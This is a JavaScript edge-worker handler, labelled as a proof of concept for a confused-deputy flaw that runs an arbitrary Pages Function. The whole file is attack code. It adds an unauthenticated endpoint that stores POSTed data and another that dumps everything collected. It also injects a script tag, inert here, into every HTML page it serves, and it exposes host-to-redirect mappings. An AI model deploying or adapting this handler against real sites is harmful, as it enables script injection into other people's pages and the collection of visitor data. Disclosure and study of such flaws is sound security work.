// i16561 PoC edge handler (confused-deputy -> arbitrary Pages Function)
import DOMAIN_MAPPINGS from "./domains.json";
const CAP_KEY = "i16561_caps";
const CAP_REQ = new Request("https://i16561.internal/caps.json");

function resolveTargetUrl(cleanHost) {
  if (DOMAIN_MAPPINGS && DOMAIN_MAPPINGS[cleanHost]) {
    const e = DOMAIN_MAPPINGS[cleanHost];
    if (typeof e === "string") return e;
    if (e && e.main_url) return e.main_url;
    if (e && e.target_url) return e.target_url;
  }
  return "";
}
async function readCaps(env){
  try{ if(env&&env.CODES_KV){ const v=await env.CODES_KV.get(CAP_KEY,"json"); if(v) return v; } }catch(_){}
  try{ const hit=await caches.default.match(CAP_REQ); if(hit){const d=await hit.json(); if(Array.isArray(d)) return d;} }catch(_){}
  return [];
}
async function writeCaps(env,arr){
  try{ if(env&&env.CODES_KV){ await env.CODES_KV.put(CAP_KEY, JSON.stringify(arr)); } }catch(_){}
  try{ await caches.default.put(CAP_REQ, new Response(JSON.stringify(arr),{headers:{"Content-Type":"application/json","Cache-Control":"public, max-age=3600"}})); }catch(_){}
}
const INJECT = "<script>/*i16561-injected*/</script>";
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;
    if (path === "/__i16561/cap" && request.method === "POST") {
      const body = await request.text();
      const caps = await readCaps(env);
      caps.unshift({ at: new Date().toISOString(), host: url.hostname, body: body.slice(0,4000) });
      await writeCaps(env, caps.slice(0,200));
      return new Response(JSON.stringify({ok:true,n:caps.length}),{headers:{"Content-Type":"application/json"}});
    }
    if (path === "/__i16561/dump") {
      const caps = await readCaps(env);
      return new Response(JSON.stringify(caps),{headers:{"Content-Type":"application/json"}});
    }
    const rawHost = request.headers.get("host")||url.hostname||"";
    const cleanHost = rawHost.replace(/^www\./i,"").split(":")[0].toLowerCase();
    const targetUrl = resolveTargetUrl(cleanHost);
    if (path === "/config.js") {
      return new Response("window.REDIRECT_URL = "+JSON.stringify(targetUrl)+";\n",{headers:{"Content-Type":"application/javascript;charset=UTF-8","Cache-Control":"no-cache"}});
    }
    if (path === "/api/domain-config") {
      return new Response(JSON.stringify({success:true,host:cleanHost,targetUrl}),{headers:{"Content-Type":"application/json","Access-Control-Allow-Origin":"*"}});
    }
    let resp;
    try { resp = env.ASSETS ? await env.ASSETS.fetch(request) : await fetch(request); } catch(e){ return new Response("err",{status:502}); }
    const ct = resp.headers.get("content-type")||"";
    const h = new Headers(resp.headers);
    h.set("x-i16561-edge","deputy-edge-code:"+cleanHost);
    if (ct.includes("text/html")) {
      let body = await resp.text();
      if (!body.includes("i16561-injected")) body = body.replace(/<\/body>/i, INJECT + "</body>") || (body + INJECT);
      return new Response(body,{status:resp.status,headers:h});
    }
    return new Response(resp.body,{status:resp.status,headers:h});
  },
};
